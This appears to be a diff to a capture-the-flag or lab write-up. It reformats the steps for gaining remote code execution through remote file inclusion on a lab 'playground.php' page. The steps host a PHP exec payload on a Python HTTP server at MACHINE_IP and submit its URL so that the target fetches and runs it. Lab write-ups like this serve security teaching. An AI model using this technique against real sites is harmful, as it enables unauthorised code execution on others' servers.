@@ -277,7 +277,11 @@ Gain RCE in **Lab #Playground** \`/playground.php\` with RFI to execute the \`ho
 **Reason:**
 1. First, start a server using \`python3 -m http.server 8000\`.
 2. Then, create a payload using PHP to execute the \`hostname\` command and save it as \`payload.php\`. Remember to put the payload in the same folder as the server.
-\`\`\`<?php print exec('hostname'); ?>\`\`\`
-3. Go to the form and enter in the payload \`http://MACHINE_IP:8000/payload.php\` and we can see that the flag appear on the page.
+\`\`\`
+<?php
+print exec('hostname');
+?>
+\`\`\`
+3. Go to the form on the lab page and enter in the payload \`http://MACHINE_IP:8000/payload.php\` and we can see that the flag appear on the page.
 `
 }
